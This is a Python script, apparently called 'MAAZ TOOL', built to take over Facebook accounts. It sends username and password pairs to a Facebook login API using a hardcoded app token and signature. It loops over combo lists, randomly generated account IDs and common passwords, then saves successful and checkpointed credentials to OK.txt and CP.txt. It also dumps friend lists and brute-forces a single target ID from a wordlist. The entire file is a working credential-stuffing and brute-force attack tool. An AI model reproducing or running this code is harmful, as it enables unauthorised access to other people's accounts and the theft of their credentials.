#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import uuid
import json
import random
import threading
import requests
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import Progress

console = Console()

# ─── Banner ──────────────────────────────────────────────────────────────
BANNER = """
[bold cyan]
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝   MAAZ TOOL
[/bold cyan]
"""

def show_banner():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass
    console.print(Panel(BANNER, style="bold blue"))

# ─── Login Engine ─────────────────────────────────────────────────────────
def fb_login(uid, pwd, ok_file, cp_file):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/89.0.4389.90 Mobile Safari/537.36",
    }
    data = {
        "email": uid,
        "pass": pwd,
        "login_source": "comet_log_in",
        "fb_api_req_friendly_name": "authenticate",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "format": "JSON",
        "sdk_version": "2",
        "generate_session_cookies": "1",
        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
    }
    try:
        res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers).json()
        if "session_key" in res and "EAAA" in res.get("access_token", ""):
            console.print(f"[bold green][OK][/bold green] {uid}|{pwd}")
            ok_file.write(f"{uid}|{pwd}\n")
        elif "error_msg" in res and "www.facebook.com" in res["error_msg"]:
            console.print(f"[bold yellow][CP][/bold yellow] {uid}|{pwd}")
            cp_file.write(f"{uid}|{pwd}\n")
    except:
        pass

# ─── Method Definitions ──────────────────────────────────────────────────
def method1_old():
    show_banner()
    if not os.path.exists("combo.txt"):
        console.print("[red]❌ combo.txt not found![/red]")
        return
    ok_file = open("OK.txt", "a")
    cp_file = open("CP.txt", "a")
    combos = open("combo.txt").read().splitlines()
    for combo in combos:
        try:
            uid, pwd = combo.split("|")
            fb_login(uid, pwd, ok_file, cp_file)
        except:
            continue
    ok_file.close()
    cp_file.close()


def method2_series():
    show_banner()
    prefixes = ["100000", "100001", "100002", "100003", "100004"]
    limits = {"1": 5000, "2": 10000, "3": 99999}
    uid_prefix = prefixes[0]
    limit = limits["1"]
    uids = [uid_prefix + str(random.randint(1111111, 9999999)) for _ in range(limit)]
    passwords = ["123456", "12345678", "123456789", "000000"]
    ok_file = open("OK.txt", "a")
    cp_file = open("CP.txt", "a")
    for uid in uids:
        for pwd in passwords:
            fb_login(uid, pwd, ok_file, cp_file)
    ok_file.close()
    cp_file.close()


def method3_brute_uid():
    show_banner()
    prefixes = ["100000", "100001", "100002"]
    limit = 5000
    passwords = ["123456", "12345678", "123456789", "password"]
    ok_file = open("OK.txt", "a")
    cp_file = open("CP.txt", "a")
    for _ in range(limit):
        uid = random.choice(prefixes) + str(random.randint(1111111, 9999999))
        for pwd in passwords:
            fb_login(uid, pwd, ok_file, cp_file)
    ok_file.close()
    cp_file.close()


def method4_combo_gen():
    show_banner()
    prefixes = ["100000", "100001", "100002"]
    passwords = ["123456", "12345678", "password", "iloveyou"]
    limit = 5000
    with open("combo.txt", "w") as f:
        for _ in range(limit):
            uid = random.choice(prefixes) + str(random.randint(1111111, 9999999))
            pwd = random.choice(passwords)
            f.write(f"{uid}|{pwd}\n")


def method5_uid_dump():
    show_banner()
    pid = "me"  # hardcoded for demo
    token = "demo-token"
    try:
        r = requests.get(f"https://graph.facebook.com/{pid}/friends?access_token={token}").json()
        if "data" not in r:
            return
        with open("dump.txt", "w") as f:
            for fr in r["data"]:
                f.write(f"{fr['id']}|{fr['name']}\n")
    except:
        pass


def dev_brute():
    show_banner()
    target = "100000123456789"
    if not os.path.exists("wordlist.txt"):
        with open("wordlist.txt", "w") as f:
            f.write("\n".join(["123456", "12345678", "password"]))
    pwds = open("wordlist.txt").read().splitlines()
    ok_file = open("OK.txt", "a")
    cp_file = open("CP.txt", "a")
    for pwd in pwds:
        fb_login(target, pwd, ok_file, cp_file)
    ok_file.close()
    cp_file.close()

# ─── Auto Setup ──────────────────────────────────────────────────────────
def auto_setup():
    files = ["combo.txt", "OK.txt", "CP.txt", "wordlist.txt"]
    for file in files:
        if not os.path.exists(file):
            open(file, "w").close()
    try:
        import requests, rich
    except:
        os.system("pip install requests rich")

# ─── Main ─────────────────────────────────────────────────────────────────
def main():
    auto_setup()
    show_banner()
    method1_old()
    method2_series()
    method3_brute_uid()
    method4_combo_gen()
    method5_uid_dump()
    dev_brute()

if __name__ == "__main__":
    main()
